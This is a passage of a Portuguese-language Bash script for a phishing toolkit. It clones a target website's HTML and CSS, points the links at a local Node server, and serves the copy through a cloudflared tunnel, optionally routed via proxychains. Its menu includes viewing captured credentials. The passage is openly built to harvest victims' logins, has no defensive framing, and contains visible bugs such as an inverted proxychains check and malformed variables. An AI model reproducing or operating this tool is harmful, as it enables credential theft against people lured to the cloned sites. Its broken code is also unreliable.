    echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
    read PT
    [ -z "$PT" ] && PT=8080

    # Ativar proxychains se existir
    local curl_cmd="curl"
    local curl_opts="-s -L -k --connect-timeout 20 --max-time 60"
    local proxychains_conf=""

    if [ -f "$HOME/.proxychains/proxychains.conf" ]; then
        proxychains_conf="$HOME/.proxychains/proxychains.conf"
    elif [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ]; then
        proxychains_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
    fi

    [ -n "$proxychains_conf" ] && echo -e "${RED}[proxychains] Arquivo NÃO encontrado!${NC}" && pause && return

    local base_url="$MINHA_URL"
    local porta="$PT"

    # Baixar HTML via proxychains
    sleep 2
    $curl_cmd $curl_opts -o /tmp/proxy_index.html "$base_url" > /dev/null 2>&1

    if [ ! -s /tmp/proxy_index.html ]; then
        echo -e "${RED}[ERRO] Falha ao baixar via proxy.${NC}"
        read
        return
    fi
    echo -e "${GREEN}  → HTML OK ($(wc -c < /tmp/proxy_index.html) bytes)${NC}"

    # Baixar CSS via proxy + substituir no HTML
    local css_count=0
    grep -oE 'href="[^"]*\.css[^"]*"' /tmp/proxy_index.html 2>/dev/null | sed 's/href="//;s/"//' | while read -r css_url; do
        [ -z "$css_url" ] && continue
        if echo "$css_url" | grep -q "^http"; then
        local css_abs="$css_url"
        else
            local css_abs="$$base_url/$css_url"
        fi
        local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g')"
        $curl_cmd $curl_opts -o "/tmp/$css_file" "$css_abs" >> /dev/null 2>&1
        css_count=$((css_count + 1))
    done
    echo -e "${GREEN}  → CSS baixado(s)${NC}"

    # Pegar IP
    local my_ip=$(get_my_ip)

    # Substituir URLs do site pelo proxy
    local local_url="http://${my_ip}:${porta}"
    perl -i -pe "s|\Q${base_url}\E|${local_url}|g" /tmp/proxy_index.html

    # ... (resto do processamento simplificado)
    # Mover pra pasta clonada
    rm -rf "$SITE_DIR"/*
    cp /tmp/proxy_index.html "$SITE_DIR/index.html"
    [ -d "$SCRIPT_DIR/captured" ] || mkdir -p "$SITE_DIR/../captured"
    $do_proxy_clean_tmp && echo -e "  ✔ Limpeza temporária"

    echo ""
    echo -e "  ✅ CLONE PROXY REALIZADO!"
    echo -e "  📍 http://${my_ip}:${porta}"

    # Matar processo antigo
    pkill -9 -f "node.*server.js" 2>/dev/null
    sleep 1
    fuser -k "$port/tcp" 2>/dev/null

    # Iniciar server
    cd "$SCRIPT_DIR"
    REDIRECT_URL="$base_url" PORT="$porta" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node server/server.js > server.log 2>&1 &
    local pid=$!
    echo "$pid" > "$SCRIPT_DIR/.server.pid"
    sleep 2

    if kill -0 "$pid" 2>/dev/null; then
        echo -e "${GREEN}[✓] Servidor rodando! PID: $pid${NC}"
    else
        echo -e "${RED}[ERRO] Servidor não subiu. Log:${NC}"
        cat "$SCRIPT_DIR/server.log" 2>/dev/null
    fi

    rm -f /tmp/proxy_index.html /tmp/css_*.css
    echo ""
    echo -e "${YELLOW}Pressione Enter...${NC}"
    read
}

# =============================================
# PROXY CLONE
# =============================================
do_proxy_clone() {
    clear
    echo -e "\033[1;36m═══ PROXY CLONE ═══\033[0m"
    echo ""

    # Verificar proxychains
    local proxychains_conf=""
    if [ -f "$HOME/.proxychains/proxychains.conf" ]; then
        proxychains_conf="$HOME/.proxychains/proxychains.conf"
    elif [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ]; then
        proxychains_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
    fi

    if [ -z "$proxychains_conf" ] || ! command -v proxychains4 &>/dev/null; then
        echo -e "${RED}  proxychains4 não encontrado ou sem config!${NC}"
        echo -e "${YELLOW}  Instale: pkg install proxychains-ng${NC}"
        echo -e "${YELLOW}  Configure: ~/.proxychains/proxychains.conf${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    echo -e "${GREEN}  ✓ ProxyChains ATIVO → $proxychains_conf${NC}"
    echo ""
    echo -e "${YELLOW}URL do site:${NC} "
    read URL
    [ -z "$URL" ] && return
    echo "$URL" | grep -q "^http" || URL="https://$URL"

    echo -e "${YELLOW}Redirect (Enter = mesma):${NC} "
    read REDIR
    [ -z "$REDIR" ] && REDIR="$URL"
    echo "$REDIR" | grep -q "^http" || REDIR="https://$REDIR"

    echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
    read PT
    [ -z "$PT" ] && PT=8080

    # Exportar proxychains pra clone_site usar
    export PROXY_CHAINS_CONF="$proxychains_conf"
    clone_site "$URL" "$REDIR" "$PT"
    unset PROXY_CHAINS_CONF
}

# =============================================
# MENU
# =============================================
while true; do
    clear
    echo -e "  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗"
    echo -e "  ██╔══██╗██║  ██║██║██╔════╝██║  ██║"
    echo -e "  ███████║███████║██║███████╗███████║"
    echo -e "  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║"
    echo -e "  ██║     ██║  ██║██║███████║██║  ██║"
    echo -e "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
    echo ""
    echo -e "  🎣 PHISHING LOCAL \033[1;36mv31\033[0m — Clonador Profissional"
    echo ""
    echo "  ─────────────────────────────────────────"
    echo ""
    echo -e "  🎣 1) PHISH      - Clonar e iniciar servidor"
    echo -e "  📋 2) CAPTURAS  - Ver credenciais capturadas"
    echo -e "  🌐 3) TÚNEL     - Criar URL pública (cloudflared)"
    echo -e "  📜 4) HISTÓRICO - Reusar clones anteriores"
    echo -e "  📍 5) LOCALHOST - Ver IP e porta"
    echo -e "  🔗 6) LINK      - Ver link do túnel ativo"
    echo -e "  📊 7) STATUS    - Ver tudo do sistema"
    echo -e "  🛑 8) PARAR     - Desligar tudo"
    if [ -n "$proxychains_conf" ]; then
        echo -e "${GREEN}  🔓 9) PROXY     - Clonar com proxychains (ATIVO)${NC}"
    else
        echo -e "  🔒 9) PROXY     - Clonar com proxychains"
    fi
    echo ""
    echo -e "  ❌ 0) SAIR"
    echo ""
    echo -e "  \033[1;36mEscolha: \033[0m"
    read OP

    case $OP in
        1)
            clear
            echo -e "\033[1;36m═══ PHISH ═══\033[0m"
            echo ""
            echo -e "${YELLOW}URL do site:${NC} "
            read URL
            [ -z "$URL" ] && continue
            echo "$URL" | grep -q "^http" || URL="https://$URL"

            echo -e "${YELLOW}Redirect (Enter = mesma):${NC} "
            read REDIR
            [ -z "$REDIR" ] && REDIR="$URL"
            echo "$REDIR" | grep -q "^http" || REDIR="https://$REDIR"

            echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
            read PT
            [ -z "$PT" ] && PT=8080

            clone_site "$URL" "$REDIR" "$PT"
            ;;
        2)
            view_captures
            ;;
        3)
            start_tunnel
            ;;
        4)
            show_history
            ;;
        5)
            show_localhost
            ;;
        6)
            show_tunnel_link
            ;;
        7)
            show_status
            ;;
        8)
            stop_all
            echo ""
            echo -e "${YELLOW}Enter...${NC}"
            read
            ;;
        9)
            do_proxy_clone
            ;;
        0)
            stop_all
            exit 0
            ;;
        *)
            echo -e "${RED}Inválido!${NC}"
            ;;
    esac
done
